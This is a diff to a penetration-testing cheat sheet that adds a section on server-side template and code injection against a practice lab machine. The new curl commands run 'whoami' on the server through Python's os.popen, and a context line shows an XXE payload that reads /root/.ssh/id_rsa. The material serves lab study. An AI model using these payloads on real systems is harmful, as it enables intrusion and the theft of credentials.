@@ -62,6 +62,8 @@
 		- [wfuzz](#wfuzz)
 		- [WPScan](#wpscan)
 		- [XML External Entity (XXE)](#xml-external-entity-xxe)
+  	- [API Testing](#api-testing)
+  		- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
 	- [Database Analysis](#database-analysis)
  		- [impacket-mssqlclient](#impacket-mssqlclient)
 		- [MongoDB](#mongodb)
@@ -2449,6 +2451,22 @@ Content-Length: 136
 
 ```shell
 username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
+```
+
+### API Testing
+
+#### Server-Side Template Injection (SSTI)
+```cmd
+# This is a example from the PG Machine Hetemit 
+# [Werkzeug httpd 1.0.1 (Python 3.6.8) Server]
+$ curl -i http://192.168.143.117:50000/verify -X POST --data "code=asdf"
+Internal Server Error
+
+$ curl -i http://192.168.143.117:50000/verify -X POST --data "code=5*5"
+25
+
+$ curl -i http://192.168.143.117:50000/verify -X POST --data "code=__import__('os').popen('whoami').read()"
+username
 ```
 
 ### Database Analysis
